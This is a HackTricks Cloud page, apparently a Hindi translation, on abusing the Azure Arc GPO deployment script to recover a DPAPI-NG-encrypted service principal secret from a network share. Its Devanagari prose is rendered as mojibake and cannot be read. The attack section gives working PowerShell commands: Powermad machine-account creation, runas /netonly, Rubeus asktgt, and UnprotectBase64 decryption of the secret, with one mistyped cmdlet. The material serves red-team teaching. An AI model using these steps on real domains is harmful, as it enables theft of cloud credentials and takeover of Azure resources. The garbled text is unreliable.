# Az - рдПрдЬрд╝реНрдпреВрд░ рдЖрд░реНрдХ рд╡рд▓рдирд░реЗрдмрд▓ рдЬреАрдкреАрдУ рдбрд┐рдкреНрд▓реЙрдп рд╕реНрдХреНрд░рд┐рдкреНрдЯ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

### рдореБрджреНрджреЛрдВ рдХреА рдкрд╣рдЪрд╛рди

рдПрдЬрд╝реНрдпреВрд░ рдЖрд░реНрдХ рдирдП рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ (рд╢рд╛рдорд┐рд▓ рдбреЛрдореЗрди рд╕рд░реНрд╡рд░) рдХреЛ рдПрдЬрд╝реНрдпреВрд░ рдЖрд░реНрдХ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреАрдкреАрдУ рдСрдмреНрдЬреЗрдХреНрдЯ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЗрд╕рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдЖрд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдЯреВрд▓рдХрд┐рдЯ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред ArcEnableServerGroupPolicy.zip рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ: DeployGPO.ps1, EnableAzureArc.ps1, рдФрд░ AzureArcDeployment.psm1ред

рдЬрдм рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ DeployGPO.ps1 рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рддрд╛ рд╣реИ:

1. рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ рдПрдЬрд╝реНрдпреВрд░ рдЖрд░реНрдХ рд╕рд░реНрд╡рд░реНрд╕ рдСрдирдмреЛрд░реНрдбрд┐рдВрдЧ рдЬреАрдкреАрдУ рдмрдирд╛рддрд╛ рд╣реИред
2. рдСрдирдмреЛрд░реНрдбрд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдореЗрдВ EnableAzureArc.ps1 рдСрдирдмреЛрд░реНрдбрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ Windows рд╕реНрдерд╛рдкрдХ рдкреИрдХреЗрдЬ рднреА рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛рддреЗ рд╕рдордп, рд╕рд┐рд╕реНрдЯрдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рдХреЛ рджреЛ рдореБрдЦреНрдп рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ: **ServicePrincipalId** рдФрд░ **ServicePrincipalClientSecret**ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдбреЛрдореЗрди, рд╢реЗрдпрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдХреЗ FQDN, рдФрд░ рд╢реЗрдпрд░ рдХрд╛ рдирд╛рдо рдЬреИрд╕реЗ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░ рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреЗ рд╣реИрдВред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ tenant ID, рд╕рдВрд╕рд╛рдзрди рд╕рдореВрд╣, рдФрд░ рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рднреА рдкреНрд░рджрд╛рди рдХрд░рдиреА рд╣реЛрддреА рд╣реИред

рдПрдХ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЧреБрдкреНрдд рд╕реАрдХреНрд░реЗрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╢реЗрдпрд░ рдкрд░ AzureArcDeploy рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ DPAPI-NG рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП DeployGPO.ps1 рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╕рд╛рдХреНрд╖рд╛рддреНрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ $descriptor рдФрд░ $ServicePrincipalSecret рдХреЗ рд╕рд╛рде ProtectBase64 рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдореЗрдВ рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рдФрд░ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕рдореВрд╣ SIDs рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдФрд░ рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рд╣реА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### рд╢рд╛рддреНрд░реБрддрд╛

рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рд╣реИрдВ:

1. рд╣рдордиреЗ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╡реЗрд╢ рдХрд┐рдпрд╛ рд╣реИред
2. рд╣рдореЗрдВ рдХрд┐рд╕реА рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХреЛ рдмрдирд╛рдиреЗ рдпрд╛ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд▓реЗрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ рдЬреЛ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдЕрдВрджрд░ рд╣реИред
3. рд╣рдордиреЗ рдПрдЬрд╝реНрдпреВрд░рдЖрд░реНрдХрдбрд┐рдкреНрд▓реЙрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рд╕рдореЗрдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдЦреЛрдЬ рд▓рд┐рдпрд╛ рд╣реИред

рдПрдбреА рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЕрдВрджрд░ рдПрдХ рдорд╢реАрди рдЦрд╛рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рд╡рд┐рдзрд┐рдпрд╛рдБ рд╣реИрдВред рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдорд╢реАрди рдЦрд╛рддрд╛ рдХреЛрдЯрд╛ рдХрд╛ рд╢рд╛рддреНрд░реБрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рджреВрд╕рд░рд╛ рд╡рд┐рдзрд┐ рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрд░реЛрдзрд┐рдд ACLs рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рдЕрдиреНрдп рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдорд╢реАрди рдЦрд╛рддреЗ рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛рдирд╛ рд╣реИред
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
рдПрдХ рдорд╢реАрди рдЕрдХрд╛рдЙрдВрдЯ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдЗрд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрднрд╡ рд╣реИред рд╣рдо рдиреЗрдЯрдирд▓реА рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде runas.exe рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ Rubeus.exe рдХреЗ рд╕рд╛рде рдкрд╛рд╕-рдж-рдЯрд┐рдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
рд╣рдорд╛рд░реЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП TGT рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рдХреЗ, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рд╣рдо [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд╣рдо Azure рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╢реЗрд╖ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ ArcInfo.json рдлрд╝рд╛рдЗрд▓ рд╕реЗ, рдЬреЛ encryptedServicePrincipalSecret рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдкрд░ рд╕реНрдЯреЛрд░ рд╣реИред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╡рд┐рд╡рд░рдг рд╣реЛрддрд╛ рд╣реИ рдЬреИрд╕реЗ: TenantId, servicePrincipalClientId, ResourceGroup, рдФрд░ рдЕрдзрд┐рдХред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рд╣рдо Azure CLI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝реНрдб рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
